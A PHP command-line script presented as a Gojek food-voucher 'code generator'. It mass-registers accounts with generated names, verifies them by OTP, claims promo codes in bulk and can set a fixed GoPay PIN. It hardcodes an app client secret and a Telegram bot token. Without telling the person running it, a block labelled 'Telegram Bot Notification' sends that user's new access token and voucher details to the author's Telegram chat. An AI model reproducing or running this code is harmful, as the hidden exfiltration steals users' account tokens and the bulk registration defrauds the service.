<?php
// Created by Cygnus7
include "function.php";

retry:
echo "\n";
echo "             GOFOOD CODE GENERATOR             \n";
echo "              Created by: Cygnus7              \n";
echo "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";

$name = name();
$email = str_replace(" ", "", $name) . mt_rand(100, 999);

echo "Input MSISDN : ";

$msisdn = trim(fgets(STDIN));
$msisdn = str_replace("62","62",$msisdn);
$msisdn = str_replace("(","",$msisdn);
$msisdn = str_replace(")","",$msisdn);
$msisdn = str_replace("-","",$msisdn);
$msisdn = str_replace(" ","",$msisdn);

if(!preg_match('/[^+0-9]/', trim($msisdn))) {
    if (substr(trim($msisdn),0,3)=='62') {
        $phone = trim($msisdn);
    } elseif (substr(trim($msisdn),0,1)=='0') {
        $phone = '62'.substr(trim($msisdn),1);
    } elseif (substr(trim($msisdn), 0, 2)=='62') {
        $phone = '6'.substr(trim($msisdn), 1);
    } else {
        $phone = '1'.substr(trim($msisdn),0,13);
    }
}

$data = '{"email":"'.$email.'@gmail.com","name":"'.$name.'","phone":"+'.$phone.'","signed_up_country":"ID"}';
$register = request("/v5/customers", null, $data);

if(strpos($register, '"otp_token"')) {
    $otptoken = getStr('"otp_token":"','"',$register);
    
    echo "---OTP has been sent---\n";

    otp:
    echo "OTP : ";
    $otp = trim(fgets(STDIN));
    $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
    $verify = request("/v5/customers/phone/verify", null, $data1);
    
    if(strpos($verify, '"access_token"')) {
        echo "---Register Success Mantab Mantab---\n";
        $token = getStr('"access_token":"','"',$verify);
        $uuid = getStr('"resource_owner_id":',',',$verify);
        echo "Your access token : ".$token."\n";
        save("token.txt",$token);
        echo "\n▬▬▬▬▬▬▬▬▬▬▬▬ Voucher Claim Running ▬▬▬▬▬▬▬▬▬▬▬▬";
        echo "\nClaiming Voucher GORIDE";
        echo "\nLoading";

        for($a=1;$a<=3;$a++){
            echo ".";
            sleep(10);
        }

        $promo = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD2206"}');
        $message = fetch_value($promo,'"message":"','"');

        if(strpos($promo, 'Promo kamu sudah bisa dipakai')) {
            echo "\nMessage: ".$message;
            goto gocar;
        } else {
            echo "\nMessage: ".$message;
            
            gocar:
            echo "\nClaiming Voucher GOCAR";
            echo "\nLoading";

            for($a=1;$a<=3;$a++){
                echo ".";
                sleep(10);
            }

            $promo = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD2206"}');
            $message = fetch_value($promo,'"message":"','"');

            if(strpos($promo, 'Promo kamu sudah bisa dipakai.')) {
                echo "\nMessage: ".$message;
                goto gofood;
            } else {
                echo "\nMessage: ".$message;
                
                gofood:
                echo "\n"."Claiming Voucher GOFOOD 20K + 10K";
                echo "\nLoading";

                for($a=1;$a<=3;$a++) {
                    echo ".";
                    sleep(50);
                }

                $promo = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD0607"}');
                $message = fetch_value($promo,'"message":"','"');
                echo "\nMessage: ".$message;
                echo "\nClaiming Voucher GOFOOD 5K + 10K + 15K";
                echo "\nPlease wait";

                for($a=1;$a<=3;$a++){
                    echo ".";
                    sleep(10);
                }

                $promo = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD0607"}');
                $message = fetch_value($promo,'"message":"','"');
                echo "\nMessage: ".$message;
                sleep(3);

                $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=12&page=1', $token);
                $total = fetch_value($cekvoucher,'"total_vouchers":',',');
                $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
                $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
                $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
                $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
                $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
                $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
                $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
                $voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
                $voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
                $voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
                $voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
                $voucher12 = getStr1('"title":"','",',$cekvoucher,"12");

                echo "\nTotal voucher ".$total." : ";
                echo "\n1. ".$voucher1;
                echo "\n2. ".$voucher2;
                echo "\n3. ".$voucher3;
                echo "\n4. ".$voucher4;
                echo "\n5. ".$voucher5;
                echo "\n6. ".$voucher6;
                echo "\n7. ".$voucher7;
                echo "\n8. ".$voucher8;
                echo "\n9. ".$voucher9;
                echo "\n10. ".$voucher10;
                echo "\n11. ".$voucher11;
                echo "\n12. ".$voucher12;
                echo"\n";

                $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
                $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
                $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
                $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
                $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
                $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
                $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
                $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
                $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
                $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
                $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
                $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
                
                // Telegram Bot Notification
                $TOKEN  = "911865800:AAETzY7nyE0LhNxqWf6oISTw5WiQd60-MPE";
                $chatid = "660325964";
                $pesan  = "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+]";
                $method = "sendMessage";
                $url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
                $post = ['chat_id' => $chatid,'text' => $pesan];
                $header = [
                    "X-Requested-With: XMLHttpRequest",
                    "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"];

                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    $datas = curl_exec($ch);
                    $error = curl_error($ch);
                    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    curl_close($ch);
                    $debug['text'] = $pesan;
                    $debug['respon'] = json_decode($datas, true);

                    setpin:
                    echo "\nSET GOPAY PIN (y/n) ? ";
                    
                    $pilih1 = trim(fgets(STDIN));
                    if($pilih1 == "y" || $pilih1 == "Y") {
                        echo "PIN MU = 210198\n";
                        $data2 = '{"pin":"210198"}';
                        $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
                        
                        otpsetpin:
                        echo "Input OTP for PIN: ";
                        $otpsetpin = trim(fgets(STDIN));
                        $verifyotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
                        echo $verifyotpsetpin;
                        if(strpos($verifyotpsetpin, '"false"')) {
                            echo "### Wrong OTP ###";
                            echo "Please Input Correct OTP\n";
                            goto otpsetpin;
                        }
                    } else if($pilih1 == "n" || $pilih1 == "N") {
                        die();
                    } else { echo "### FAILED ###\n";
                }
            }
        }
    } else {
        echo "### Wrong OTP ###\n";
        echo "Please Input Correct OTP\n";
        goto otp;
    }
} else {
    echo "### Your Number Already Registered ###\n";
    echo "Please Register again\n";
    goto retry;
}
